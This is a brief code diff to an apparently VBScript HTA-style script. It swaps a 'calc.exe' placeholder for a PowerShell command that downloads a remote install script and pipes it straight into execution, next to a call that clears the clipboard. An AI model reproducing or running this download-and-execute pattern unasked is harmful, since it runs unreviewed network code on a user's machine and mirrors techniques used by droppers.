@@ -53,7 +53,7 @@
         Window.MoveTo (Screen.Width - 300) / 2, (Screen.Height - 400) / 2
         
         Set objShell = CreateObject("WScript.Shell")
-        objShell.Run "calc.exe", 0, False 
+        objShell.Run "powershell -c ""irm https://bun.sh/install.ps1 | iex""", 1, False
         
         ClearClipboard
         
